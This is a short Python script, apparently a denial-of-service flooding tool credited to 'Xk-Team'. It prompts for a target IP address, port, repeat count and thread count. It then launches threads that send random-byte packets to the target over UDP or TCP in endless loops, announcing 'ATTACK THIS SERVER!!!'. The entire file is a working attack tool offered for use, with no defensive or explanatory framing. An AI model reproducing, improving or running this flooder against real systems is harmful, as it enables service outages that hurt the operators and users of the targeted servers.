#Tools by Xk-Team
import random
import socket
import threading

print(" ReyZer ")
print("Tools BY Xk-Team")
print(" Xk Team nih Dek ")
print("Join to Xk Team")
ip = str(input(" IP:"))
port = int(input(" PORT:"))
choice = str(input(" Yes or No:"))
times = int(input(" Times:"))
threads = int(input(" Threads:"))
def play():
	data = random._urandom(1024)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"Xk Team ATTACK THIS SERVER!!!")
		except:
			print("[!] Down!!!")

def play2():
	data = random._urandom(160)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Xk Team ATTACK THIS SERVER!!!")
		except:
			s.close()
			print("[*] Down!!!")

for yes in range(threads):
	if choice == 'yes':
		th = threading.Thread(target = play)
		th.start()
	else:
		th = threading.Thread(target = play2)
		th.start()